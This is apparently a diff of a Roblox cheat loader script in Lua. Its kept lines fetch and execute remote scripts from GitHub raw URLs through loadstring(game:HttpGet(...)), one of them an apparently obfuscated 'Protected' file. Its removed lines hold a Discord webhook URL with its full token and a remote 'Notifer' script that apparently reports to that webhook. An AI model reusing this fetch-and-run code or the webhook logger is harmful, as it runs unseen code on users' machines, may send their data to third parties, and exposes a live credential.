@@ -1,21 +1,6 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/noGlxcka/glxck.ccc/main/Protected_4982147842562957.lua.txt'))()
 
 
-getgenv().Title = "glxck.cc"
-getgenv().ThumbnailUrl = "https://cdn.discordapp.com/icons/1230408358012522527/97927ea908f436c03e034e5a53f4af53.webp?size=2048"
-getgenv().Color = 0x000000 -- Black
-
-getgenv().FieldTitle = ""
-getgenv().FieldText = ""
-
-getgenv().FooterText = ""
-getgenv().FooterUrl = ""
-
-getgenv().Webhook = "https://discord.com/api/webhooks/1234998457832312952/YXaurO5AAvN9KGdAJgWxRTDXelmQlllyRJ4aEsWwhvQvKwhiOx-WeLFnQnToy8jgnUOg"
-
-coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
-end)()
-
 
 wait(0.4)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/qtoolv3/main/qtoolv3", true))()
